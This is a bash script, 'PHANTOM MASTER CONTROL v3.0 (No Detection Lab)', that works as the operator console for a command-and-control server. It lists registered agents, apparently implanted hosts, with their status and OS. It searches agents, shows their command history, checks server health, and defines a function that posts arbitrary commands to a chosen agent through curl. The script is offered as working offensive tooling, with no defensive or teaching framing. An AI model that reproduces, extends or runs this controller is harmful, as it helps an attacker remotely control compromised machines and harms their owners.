#!/bin/bash
# PHANTOM MASTER CONTROL v3.0 (No Detection Lab)
C2_SERVER="${PHANTOM_C2_SERVER:?PHANTOM_C2_SERVER not set}"
SECRET_KEY="${PHANTOM_SECRET_KEY:?PHANTOM_SECRET_KEY not set}"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'

banner() {
    clear
    echo -e "${CYAN}╔═══════════════════════════════════════════════════════════╗"
    echo -e "║         🔥 PHANTOM C2 MASTER CONTROL 🔥                   ║"
    echo -e "╚═══════════════════════════════════════════════════════════╝${NC}"
}

fetch_agents() {
    curl -s -X POST -d "key=$SECRET_KEY" "$C2_SERVER?action=list_agents"
}

send_command_post() {
    local agent_id="$1"
    local command="$2"
    curl -s -X POST -d "key=$SECRET_KEY&agent_id=$agent_id&command=$command" "$C2_SERVER?action=send_command"
}

dashboard() {
    while true; do
        banner
        agents=$(fetch_agents)
        if [[ -z "$agents" || "$agents" == "[]" ]]; then
            echo -e "${YELLOW}  No agents registered${NC}"
        else
            echo "$agents" | jq -r '.[] | "\(.agent_id) | \(.status) | \(.os) | \(.last_seen)"' | while IFS='|' read -r id status os last; do
                if [[ "$status" == *"ONLINE"* ]]; then
                    echo -e "${GREEN}│ ● $id │ $status │ $os │ $last${NC}"
                else
                    echo -e "${RED}│ ○ $id │ $status │ $os │ $last${NC}"
                fi
            done
        fi
        sleep 10
    done
}

while true; do
    banner
    echo "1. Live Dashboard"
    echo "2. Search Agent"
    echo "3. Command History"
    echo "4. Server Health"
    echo "5. Exit"
    read -p "Choice: " choice
    case $choice in
        1) dashboard ;;
        2) read -p "Search: " term; fetch_agents | jq -r --arg t "$term" '.[] | select(.hostname|contains($t) or .os|contains($t)) | "\(.agent_id) | \(.hostname) | \(.status)"'; read -p "Enter to continue..." ;;
        3) read -p "Agent ID: " id; curl -s -X POST -d "key=$SECRET_KEY&agent_id=$id" "$C2_SERVER?action=command_history"; read -p "Enter to continue..." ;;
        4) curl -s -X POST -d "key=$SECRET_KEY" "$C2_SERVER?action=server_health"; read -p "Enter to continue..." ;;
        5) exit 0 ;;
    esac
done